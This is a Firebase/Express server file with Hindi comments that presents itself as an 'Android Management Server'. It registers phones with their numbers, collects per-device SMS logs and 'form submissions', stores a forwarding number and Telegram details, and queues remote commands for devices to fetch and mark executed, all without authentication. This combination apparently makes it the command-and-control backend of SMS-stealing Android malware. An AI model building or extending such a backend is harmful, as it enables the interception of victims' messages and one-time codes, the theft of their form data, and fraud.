// जरूरी लाइब्रेरीज को इम्पोर्ट करें
const functions = require("firebase-functions");
const admin = require("firebase-admin");
const express = require("express");
const cors = require("cors");

// फायरबेस को शुरू करें
admin.initializeApp();
const db = admin.firestore();

const app = express();
app.use(cors({ origin: true }));
app.use(express.json());

// --- आपके प्रॉम्प्ट के अनुसार सभी API एंडपॉइंट्स ---

// रूट URL: यह दिखाने के लिए कि सर्वर चल रहा है
app.get("/", (req, res) => {
    res.send("Android Management Server is Running on Firebase");
});

// फीचर 1: डिवाइस रजिस्टर और अपडेट करना
app.post("/device/register", async (req, res) => {
    try {
        const { device_id, ...data } = req.body;
        if (!device_id) return res.status(400).send("Device ID is required.");

        const deviceRef = db.collection("devices").doc(device_id);
        const doc = await deviceRef.get();

        if (!doc.exists) {
            // नया डिवाइस: created_at और last_seen दोनों सेट करें
            await deviceRef.set({ ...data, created_at: new Date(), last_seen: new Date() });
        } else {
            // पुराना डिवाइस: सिर्फ last_seen और अन्य डेटा अपडेट करें
            await deviceRef.update({ ...data, last_seen: new Date() });
        }
        res.json({ status: "success", message: "Device data received." });
    } catch (error) {
        res.status(500).send(error.message);
    }
});

// फीचर 2: डिवाइस लिस्ट दिखाना
app.get("/devices", async (req, res) => {
    try {
        const snapshot = await db.collection("devices").orderBy("created_at", "asc").get();
        const devices = snapshot.docs.map(doc => {
            const data = doc.data();
            const now = new Date();
            const lastSeen = data.last_seen.toDate();
            const isOnline = (now.getTime() - lastSeen.getTime()) < 30000; // 30 सेकंड का टॉलरेंस

            return {
                device_id: doc.id,
                device_name: data.device_name,
                os_version: data.os_version,
                phone_number: data.phone_number,
                battery_level: data.battery_level,
                is_online: isOnline,
                created_at: data.created_at.toDate().toISOString(),
            };
        });
        res.json(devices);
    } catch (error) {
        res.status(500).send(error.message);
    }
});

// फीचर 3 & 5: फॉरवर्डिंग नंबर और टेलीग्राम डिटेल्स (Global Settings)
app.post("/config/:key", async (req, res) => {
    try {
        const { key } = req.params;
        await db.collection("global_settings").doc(key).set(req.body);
        res.json({ status: "success", message: `${key} updated.` });
    } catch (error) {
        res.status(500).send(error.message);
    }
});

app.get("/config/:key", async (req, res) => {
    try {
        const { key } = req.params;
        const doc = await db.collection("global_settings").doc(key).get();
        if (!doc.exists) return res.status(404).send("Setting not found.");
        res.json(doc.data());
    } catch (error) {
        res.status(500).send(error.message);
    }
});


// फीचर 6: कमांड भेजना
app.post("/command/send", async (req, res) => {
    try {
        await db.collection("commands").add({
            ...req.body,
            status: "pending",
            created_at: new Date(),
        });
        res.json({ status: "success", message: "Command saved." });
    } catch (error) {
        res.status(500).send(error.message);
    }
});

// फीचर 7 & 8: फॉर्म सबमिशन और SMS लॉग्स
app.post("/device/:deviceId/:type", async (req, res) => {
    try {
        const { deviceId, type } = req.params; // type होगा 'forms' या 'sms'
        await db.collection(type === 'sms' ? 'sms_logs' : 'form_submissions').add({
            device_id: deviceId,
            ...req.body,
            submitted_at: new Date(), // दोनों के लिए एक ही टाइमस्टैम्प
        });
        res.json({ status: "success", message: "Data logged." });
    } catch (error) {
        res.status(500).send(error.message);
    }
});


// ★★★ समाधान: कमांड बार-बार भेजने की समस्या का हल ★★★
app.get("/device/:deviceId/commands", async (req, res) => {
    try {
        const snapshot = await db.collection("commands")
            .where("device_id", "==", req.params.deviceId)
            .where("status", "==", "pending").get();

        if (snapshot.empty) return res.json([]);

        const commands = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));

        // कमांड भेजने के तुरंत बाद उनका स्टेटस 'sent' में बदलें
        const batch = db.batch();
        snapshot.docs.forEach(doc => {
            batch.update(doc.ref, { status: "sent" });
        });
        await batch.commit();

        res.json(commands);
    } catch (error) {
        res.status(500).send(error.message);
    }
});

// कमांड को 'executed' मार्क करना
app.post("/command/:commandId/execute", async(req, res) => {
    try {
        const commandRef = db.collection("commands").doc(req.params.commandId);
        await commandRef.update({ status: "executed" });
        res.json({ status: "success", message: "Command executed." });
    } catch (error) {
        res.status(500).send(error.message);
    }
});


// ★★★ नया फीचर: डिवाइस डिलीट करना ★★★
app.delete("/device/:deviceId", async (req, res) => {
    try {
        const { deviceId } = req.params;
        await db.collection("devices").doc(deviceId).delete();
        // संबंधित लॉग्स भी डिलीट किए जा सकते हैं (अगर जरूरत हो)
        res.json({ status: "success", message: "Device deleted." });
    } catch (error) {
        res.status(500).send(error.message);
    }
});

// ★★★ नया फीचर: SMS डिलीट करना ★★★
app.delete("/sms/:smsId", async (req, res) => {
    try {
        // नोट: Firestore ऑटो-जनरेटेड ID का उपयोग करता है, इसलिए आपको doc ID चाहिए होगा।
        await db.collection("sms_logs").doc(req.params.smsId).delete();
        res.json({ status: "success", message: "SMS deleted." });
    } catch (error) {
        res.status(500).send(error.message);
    }
});


// एक्सप्रेस ऐप को फायरबेस फंक्शन के रूप में एक्सपोर्ट करें
exports.api = functions.region('asia-south1').https.onRequest(app);
  
